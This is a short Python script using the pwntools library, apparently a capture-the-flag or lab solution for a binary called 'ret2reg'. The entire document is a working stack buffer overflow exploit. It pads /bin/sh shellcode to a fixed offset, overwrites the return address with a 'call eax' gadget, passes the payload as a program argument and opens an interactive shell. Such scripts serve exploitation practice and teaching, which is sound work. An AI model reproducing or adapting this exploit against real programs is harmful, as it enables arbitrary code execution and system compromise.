from pwn import *


shellcode = asm(shellcraft.sh())
call_eax = p32(0x0804901d)
payload = flat([shellcode , b'a'* (0x20c - len(shellcode) ),call_eax])
io = process(argv=[ "./ret2reg",payload])
io.interactive()
